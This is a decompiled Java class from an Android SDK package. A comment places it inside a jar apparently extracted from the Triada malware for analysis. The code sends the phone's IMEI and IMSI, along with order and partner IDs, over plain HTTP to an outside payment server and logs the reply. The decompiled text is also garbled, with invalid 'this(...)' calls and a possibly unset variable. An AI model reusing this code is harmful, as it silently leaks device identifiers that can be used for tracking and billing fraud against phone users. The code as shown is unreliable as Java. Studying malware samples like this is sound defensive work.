package com.android.essdk.eyou;

import android.content.Context;
import com.android.essdk.eyou.b.e;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.i;
import com.android.essdk.eyou.e.k;
import org.apache.http.HttpEntity;

public class l {
  public static l a;
  
  public static l a() {
    if (a == null)
      a = new l(); 
    return a;
  }
  
  public void a(Context paramContext, String paramString1, int paramInt, String paramString2) {
    Context context = null;
    try {
      String str1;
      String str2 = e.g(paramContext);
      String str3 = i.d(paramContext);
      String str4 = i.b(paramContext);
      StringBuilder stringBuilder2 = new StringBuilder();
      this(String.valueOf(paramInt));
      HttpEntity httpEntity = k.a(String.format("http://service.pay.easou.com:8000/epayResultState?partnerId=%s&orderId=%s&imei=%s&imsi=%s&state=%s&appId=%s", new Object[] { paramString1, str2, str3, str4, stringBuilder2.toString(), paramString2 }), k.a(paramContext, null, null), paramContext).getEntity();
      paramContext = context;
      if (httpEntity != null)
        str1 = k.a(httpEntity); 
      StringBuilder stringBuilder1 = new StringBuilder();
      this("服务器的返回值为");
      b.b("RecodeServer", stringBuilder1.append(str1).toString());
    } catch (Exception exception) {
      b.b("RecodeServer", "服务器的返回值 异常");
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/l.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */